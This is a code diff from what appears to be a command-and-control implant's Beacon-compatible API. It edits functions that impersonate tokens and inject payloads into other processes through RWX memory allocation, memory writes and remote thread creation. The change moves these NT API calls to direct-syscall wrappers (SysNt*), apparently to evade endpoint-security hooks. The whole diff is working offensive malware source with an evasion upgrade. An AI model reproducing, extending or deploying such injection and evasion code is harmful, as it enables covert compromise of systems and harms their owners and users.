@@ -355,11 +355,11 @@ BOOL BeaconUseToken( HANDLE token )
 {
     HANDLE hImpersonateToken = INVALID_HANDLE_VALUE;
 
-    if (!Instance.Win32.NtDuplicateToken(token, 0, NULL, FALSE, TokenPrimary, &hImpersonateToken)) {
+    if ( ! SysNtDuplicateToken( token, 0, NULL, FALSE, TokenPrimary, &hImpersonateToken ) ) {
         return FALSE;
     }
 
-    if (!Instance.Win32.SetThreadToken(NULL, hImpersonateToken)) {
+    if ( ! Instance.Win32.SetThreadToken( NULL, hImpersonateToken ) ) {
         return FALSE;
     }
 
@@ -374,15 +374,17 @@ VOID BeaconGetSpawnTo( BOOL x86, char* buffer, int length )
     if ( ! buffer )
         return;
 
-    if ( x86 )
+    if ( x86 ) {
         Path = Instance.Config.Process.Spawn86;
-    else
+    } else {
         Path = Instance.Config.Process.Spawn64;
+    }
 
     Size = StringLengthW( Path ) * sizeof( WCHAR );
 
-    if ( Size > length )
+    if ( Size > length ) {
         return;
+    }
 
     MemCopy( buffer, Path, Size );
 }
@@ -422,39 +424,34 @@ VOID BeaconInjectProcess( HANDLE hProc, int pid, char* payload, int p_len, int p
 
     InitializeObjectAttributes( &ObjectAttributes, NULL, 0, NULL, NULL );
 
-    if ( ! hProc )
-    {
-        ClientID.UniqueProcess = ( HANDLE ) ( ULONG_PTR ) pid;
-        ClientID.UniqueThread  = ( HANDLE ) 0;
-        Status = Instance.Win32.NtOpenProcess( &hProc, PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientID );
-        if ( ! NT_SUCCESS( Status ) )
-        {
-            // BeaconInjectProcess does not seem to signal errors...
+    if ( ! hProc ) {
+        hProc = ProcessOpen( pid, PROCESS_ALL_ACCESS );
+        if ( ! hProc ) {
             return;
         }
     }
 
     // allocate memory space for payload
     Size = p_len * sizeof( CHAR );
-    Status = Instance.Win32.NtAllocateVirtualMemory(hProc, &p_RemoteBuf, 0, &Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    Status = SysNtAllocateVirtualMemory(hProc, &p_RemoteBuf, 0, &Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
     if ( ! NT_SUCCESS( Status ) )
         return;
 
-    Status = Instance.Win32.NtWriteVirtualMemory(hProc, p_RemoteBuf, (PVOID)payload, Size, 0);
+    Status = SysNtWriteVirtualMemory(hProc, p_RemoteBuf, (PVOID)payload, Size, 0);
     if ( ! NT_SUCCESS( Status ) )
         return;
 
     // allocate memory space for argument
     Size = a_len * sizeof( CHAR );
-    Status = Instance.Win32.NtAllocateVirtualMemory(hProc, &a_RemoteBuf, 0, &Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    Status = SysNtAllocateVirtualMemory(hProc, &a_RemoteBuf, 0, &Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
     if ( ! NT_SUCCESS( Status ) )
         return;
 
-    Status = Instance.Win32.NtWriteVirtualMemory(hProc, a_RemoteBuf, (PVOID)arg, Size, 0);
+    Status = SysNtWriteVirtualMemory(hProc, a_RemoteBuf, (PVOID)arg, Size, 0);
     if ( ! NT_SUCCESS( Status ) )
         return;
 
-    Status = Instance.Win32.NtCreateThreadEx(NULL, GENERIC_EXECUTE, NULL, hProc, (LPTHREAD_START_ROUTINE)(p_RemoteBuf + p_offset), a_RemoteBuf, FALSE, 0, 0, 0, NULL);
+    Status = SysNtCreateThreadEx(NULL, GENERIC_EXECUTE, NULL, hProc, (LPTHREAD_START_ROUTINE)(p_RemoteBuf + p_offset), a_RemoteBuf, FALSE, 0, 0, 0, NULL);
     if ( ! NT_SUCCESS( Status ) )
         return;
 }
@@ -468,29 +465,29 @@ VOID BeaconInjectTemporaryProcess( PROCESS_INFORMATION* pInfo, char* payload, in
 
     // allocate memory space for payload
     Size = p_len * sizeof(char);
-    Status = Instance.Win32.NtAllocateVirtualMemory(pInfo->hProcess, &p_RemoteBuf, 0, &Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    Status = SysNtAllocateVirtualMemory(pInfo->hProcess, &p_RemoteBuf, 0, &Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
     if (Status != STATUS_SUCCESS) {
         return;
     }
 
-    Status = Instance.Win32.NtWriteVirtualMemory(pInfo->hProcess, p_RemoteBuf, (PVOID)payload, Size, 0);
+    Status = SysNtWriteVirtualMemory(pInfo->hProcess, p_RemoteBuf, (PVOID)payload, Size, 0);
     if (Status != STATUS_SUCCESS) {
         return;
     }
 
     // allocate memory space for argument
     Size = a_len * sizeof(char);
-    Status = Instance.Win32.NtAllocateVirtualMemory(pInfo->hProcess, &a_RemoteBuf, 0, &Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    Status = SysNtAllocateVirtualMemory(pInfo->hProcess, &a_RemoteBuf, 0, &Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
     if (Status != STATUS_SUCCESS) {
         return;
     }
 
-    Status = Instance.Win32.NtWriteVirtualMemory(pInfo->hProcess, a_RemoteBuf, (PVOID)arg, Size, 0);
+    Status = SysNtWriteVirtualMemory(pInfo->hProcess, a_RemoteBuf, (PVOID)arg, Size, 0);
     if (Status != STATUS_SUCCESS) {
         return;
     }
 
-    Instance.Win32.NtCreateThreadEx(NULL, GENERIC_EXECUTE, NULL, pInfo->hProcess, (LPTHREAD_START_ROUTINE)(p_RemoteBuf + p_offset), a_RemoteBuf, FALSE, 0, 0, 0, NULL);
+    SysNtCreateThreadEx(NULL, GENERIC_EXECUTE, NULL, pInfo->hProcess, (LPTHREAD_START_ROUTINE)(p_RemoteBuf + p_offset), a_RemoteBuf, FALSE, 0, 0, 0, NULL);
 }
 
 VOID BeaconCleanupProcess( PROCESS_INFORMATION* pInfo )
